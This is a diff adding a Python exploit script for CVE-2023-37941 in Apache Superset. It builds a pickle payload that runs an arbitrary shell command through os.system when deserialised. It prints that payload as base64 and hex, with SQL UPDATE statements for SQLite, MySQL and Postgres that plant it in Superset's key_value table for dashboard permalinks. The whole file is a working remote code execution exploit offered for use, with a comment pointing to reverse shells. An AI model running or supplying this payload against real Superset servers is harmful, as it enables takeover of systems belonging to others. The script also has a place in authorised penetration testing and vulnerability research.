@@ -1,0 +1,53 @@
+#!/usr/bin/env python3
+"""
+CVE-2023-37941 exploit script for Apache Superset
+This script creates a malicious pickle payload that when deserialized
+by Apache Superset will execute the specified command.
+
+Usage:
+    python CVE-2023-37941.py -c "touch /tmp/success" -d sqlite
+    
+    -c: Command to execute
+    -d: Database type (default: sqlite)
+"""
+
+import pickle
+import base64
+import os
+import argparse
+from binascii import hexlify
+
+
+class PickleRCE:
+    def __reduce__(self):
+        # Reverse shell command
+        return os.system, (self.cmd,)
+    
+    def __init__(self, cmd):
+        self.cmd = cmd
+
+
+def main():
+    parser = argparse.ArgumentParser(description='Generate a malicious pickle payload for CVE-2023-37941')
+    parser.add_argument('-c', '--cmd', required=True, help='Command to execute')
+    parser.add_argument('-d', '--database', choices=['sqlite', 'mysql', 'postgres'], default='sqlite', help='Database type')
+    args = parser.parse_args()
+    
+    # Generate the malicious pickle payload
+    payload = pickle.dumps(PickleRCE(args.cmd), protocol=0)
+
+    # Print the payload in both base64 and hex formats
+    print("[+] Base64 encoded payload:")
+    print(base64.b64encode(payload).decode())
+    
+    print("\n[+] Hex encoded payload (for SQL): ")
+    if args.database == 'sqlite':
+        print(r'''update key_value set value=X'{data}' where resource='dashboard_permalink';'''.format(data=hexlify(payload).decode()))
+    elif args.database == 'mysql':
+        print(r'''update key_value set value=UNHEX('{data}') where resource='dashboard_permalink';'''.format(data=hexlify(payload).decode()))
+    elif args.database == 'postgres':
+        print(r'''update key_value set value='\x{data}' where resource='dashboard_permalink';'''.format(data=hexlify(payload).decode()))
+
+
+if __name__ == "__main__":
+    main()
